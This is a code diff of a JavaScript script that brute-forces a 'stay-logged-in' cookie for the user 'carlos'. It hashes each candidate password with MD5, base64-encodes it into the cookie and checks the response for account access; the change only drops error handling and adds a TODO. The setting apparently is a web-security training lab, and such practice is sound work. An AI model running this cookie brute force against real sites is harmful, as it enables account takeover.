@@ -14,18 +14,11 @@ async function task(password) {
   const hash = md5(password);
   const payload = Buffer.from(`carlos:${hash}`).toString("base64");
   const cookie = "stay-logged-in=" + payload;
-  let resp;
-
-  try {
-    resp = await httpClient.get(url, {
-      headers: {
-        cookie: cookie,
-      },
-    });
-  } catch (e) {
-    console.log(e);
-    process.exit(1);
-  }
+  const resp = await httpClient.get(url, {
+    headers: {
+      cookie: cookie,
+    },
+  });
 
   if (resp.data.includes("my-account?id=carlos")) {
     console.log(`${password}: success`);
@@ -38,6 +31,7 @@ async function task(password) {
   }
 }
 
+// TODO extract this into a function
 const tasks = [];
 for (const password of passwords) {
   tasks.push(() => task(password));
